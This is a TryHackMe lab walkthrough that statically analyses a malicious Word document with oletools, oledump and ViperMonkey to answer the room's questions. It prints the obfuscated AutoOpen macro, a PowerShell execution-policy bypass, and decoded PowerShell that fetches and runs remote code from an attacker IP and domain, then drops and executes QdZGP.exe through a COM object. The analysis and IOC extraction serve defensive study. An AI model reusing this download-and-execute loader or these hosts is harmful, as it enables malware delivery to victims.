# Try Hack Me - Squid Game, attacker 1

This is part 1 of a [5-part series of walkthroughs](../squid-game.md) for Try Hack Me's Squid Game room.

## 1. Document metadata - olemeta, oletimes

*Q6: Find the phone number in the maldoc.*  
*Q8: Provide the subject for this maldoc*  
*Q9: Provide the time when this document was last saved.*  

We start the analysis by collecting basic metadata on the sample using [olemeta](https://github.com/decalage2/oletools/wiki/olemeta) and [oletimes](https://github.com/decalage2/oletools/wiki/oletimes). This gives us information on the document title, author, and creation and modification times that may be useful for attribution, threat hunting, and the identification of the sample relative to other malware campaigns and families (but given that this information can be easily spoofed, it shouldn't be taken at face value) : 

```console
remnux@remnux:~$ olemeta attacker1.doc
FILE: attacker1.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1251                          |
|title                |Networked multi-state         |
|                     |projection                    |
|subject              |West Virginia  Samanta        |
...snip...
```

If you're attempting the task questions, it's important to note that the last save times provided by olemeta and oletimes for the sample differ by 30 seconds. I have no idea why.

## 2. Macros - oleid, oledump

*Q7: Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.*  
*Q10: Provide the stream number that contains a macro.*  
*Q11: Provide the name of the stream that contains a macro*.  

Given that we have a likely malicious .doc file, we can assume that it may contain malicious [VBA macros](https://docs.microsoft.com/en-us/office/vba/api/overview/). We can confirm the presence of macros and assess the likelihood that they are malicious with [oleid](https://github.com/decalage2/oletools/wiki/oleid) : 

```console
remnux@remnux:~$ oleid attacker1.doc 
Filename: attacker1.doc
...snip...
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
...snip...
```

So we know that the document contains VBA macros and that they are likely malicious - but where are they in the document, and what do they do? [Oledump](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py) can tell us which of the document's streams contain macros (streams with macros are indicated with an "M") : 

```console
remnux@remnux:~$ oledump.py attacker1.doc 
...snip...
  7:        41 'Macros/PROJECTwm'
  8: M    9852 'Macros/VBA/ThisDocument'
  9:      5460 'Macros/VBA/_VBA_PROJECT'
...snip...
```

and can also extract and analyse the discovered macros. In this case, oledump extracts around 30 lines of heavily obfuscated VBA code and identifies suspicious features of the macro, including the AutoOpen feature (a function that is run automatically when the document is opened) and a call to [Shell](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function) (a built-in function that can run an executable from a VBA script) : 


```console
remnux@remnux:~$ oledump.py -s 8 -v attacker1.doc 
...snip...
Sub AutoOpen()
On Error Resume Next
DBvbDlfxWGXm = WifblkBfDS + CBool(2243) + Len(ChrW(5 + 9) + ChrW(3)) + LenB(Trim("QHSiqJpWNfHbmnlvPbbP")) + Len(lZlRjJlQKnBntw)
lQbWzTrJtfhGiaS = pWNDRZbLZdGgl + CBool(5015) + Len(ChrW(1 + 1) + ChrW(2)) + LenB(Trim("XkBMzwHsSZswNPQMBDL")) + Len(SxZnBTiJkRBD)
...snip...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

## 3. Deobfuscation - vipermonkey

To further understand what the discovered macro is trying to do, we need to deobfuscate it. Given that the macro is relatively short, we could do this manually - resolving loops, removing unused variables, etc. - but this solution doesn't scale very well. Alternatively we could execute the macro in a sandboxed environment, monitoring any spawned processes (with, for example, [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)) to try and identify the call to Shell, but we want to stick to static analysis for the time being. Another alternative is to use [ViperMonkey](https://github.com/decalage2/ViperMonkey) to automate deobfuscation by emulating the marcro's execution. Running ViperMonkey on the sample (`remnux@remnux:~$ vmonkey -s attacker1.doc`) removes most of the code noise, leaving us with a macro that looks like this : 

```vb
Sub AutoOpen()
On Error Resume Next
  rjvFRbqzLtkzn = "" + ""
  SKKdjMpgJRQRK = "" + "" + Trim("")
  hdNxDVBxCTqQTpB = LTrim("")
  RJzJQGRzrc = ""
  CWflqnrJbKVBj = RTrim("") + ""
  Set pNHbvwXpnbZvS = Shapes(Trim("h9mkae7"))
  VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvwXpnbZvS.AlternativeText + "", "[", "A")) + hdNxDVBxCTqQTpB + RJzJQGRzrc + CWflqnrJbKVBj, CInt(351 * 2 + -702)
End Sub
```

This is much more approachable for manual analysis. Removing the variables that resolve to whitespace, resolving the calls to CInt() and Trim(), and replacing the random variable names gives us a macro that looks something like this (this might not actually run - I'm just cleaning it up to make it clear what the macro is trying to do): 

```vb
Sub AutoOpen()
On Error Resume Next
  Set shapeHandle = Shapes("h9mkae7")
  VBA.Shell# "CmD /C " Replace(shapeHandle.AlternativeText + "", "[", "A") , 0
End Sub
```

So the macro retrieves a [Shape object](https://docs.microsoft.com/en-us/office/vba/api/word.shape) named "h9mkae7" from the document and extracts its AlternativeText property (the alt text given to the object for accessibility purposes). It then replaces all instances of "[" in the alt text with "A", and passes the resulting string to a call to CmD (cmd.exe) using VBA.shell (the "0" at the end of this call tells Shell not to spawn a terminal window when launching cmd.exe, reducing the likelihood of immediate detection).

So we can imagine that the alt text of the "h9mkae7" object contains malicious code. But how do we extract it? Oledump allows us to search streams using ["adhoc" YARA rules](https://blog.didierstevens.com/2019/12/31/yara-ad-hoc-rules/) (that is, YARA rules defined on the command line and initilaised by Oledump at runtime). Searching for the name of our object gives the following result : 

```console
remnux@remnux:~$ oledump.py -y "#s#h9mkae7" attacker1_2.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:     13859 '1Table'
               YARA rule: string
...snip...
```

and extracting the strings from stream 4 reveals the command retrieved from h9mkae7's alt text :

```console
remnux@remnux:~$ oledump.py -s 4 -S attacker1_2.doc
h9mkae7
P^O^W^E^R^S^H^E^L^L ^-^N^o^P^r^o^f^i^l^e^ -^E^x^e^cutionPolicy B^^^yp^ass -encodedcommand J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[...
...snip...
```

We can already see that the command invokes powershell, bypassing the default execution policy and passing it a base64 encoded command. Applying the "[" / "A" replacement discovered in the macro and base64 decoding the result reveals the code executed by the powershell instance spawned by the Macro's call to Shell. We will go through this code step-by-step to have a better idea of what the malware is doing, but I've also [included it in full for reference](./attacker1.ps1).

## 4. Code Analysis

*Q1: What is the malicious C2 domain you found in the maldoc where an executable download was attempted?*  
*Q2: What executable file is the maldoc trying to drop?*  
*Q3: In what folder is it dropping the malicious executable?*  
*Q4: Provide the name of the COM object the maldoc is trying to access.*  
*Q5: Include the malicious IP and the php extension found in the maldoc*  

The code begins by creating an instance of a [WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) and a list of it's available methods, allowing the code to make HTTP requests : 

```ps1
$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
$method = [System.Net.WebClient].GetMethods();
```

The code then iterates over the list of methods looking for "[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-5.0)" and "[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-5.0)". It is not immediately clear why the code doesn't invoke these methods of the WebClient class directly, but it may be an attempt to avoid automated detection. 

DownloadString is used to make a request (`$m.Invoke(...)`) to an attacker-controlled IP address. Given that the response is passed directly to Invoke-Expression (`IEX(...)`), we can presume that this request retrieves additional Powershell code to be executed on the host :

```ps1
  if($m.Name -eq "DownloadString"){
    try{
     $uri = New-Object System.Uri("hxxp://176.32.35.16/704e.php")
     IEX($m.Invoke($instance, ($uri)));
    }catch{}
  }
```

DownloadData is then used is to make a request to an attacker-controlled domain, saving the response in the `$response` variable. The `$path` variable is declared to provide a directory (`[System.Environment]::GetFolderPath("CommonApplicationData")` resolves to `C:\ProgramData` in Windows10), random filename and .exe extension, before the response is saved to the `$path` location :

```ps1

  if($m.Name -eq "DownloadData"){
     try{
     $uri = New-Object System.Uri("hxxp://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
     $response = $m.Invoke($instance, ($uri));

     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
     [System.IO.File]::WriteAllBytes($path, $response);
```

The code then executes the downloaded executable, creating an instance of the ShellBrowserWindow COM object using its GUID before accessing the `Document.Application.ShellExecute` method to execute the file now stored at the `$path` location : 

```ps1
     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
     $type = [Type]::GetTypeFromCLSID($clsid)
     $object = [Activator]::CreateInstance($type)
     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)
```

This is as far as the analysis can go without the downloaded executable - we've discovered two IOCs in the attacker-controlled domain and IP address, and the likely name and location of an additional sample ("C:\ProgramData\QdZGP.exe").
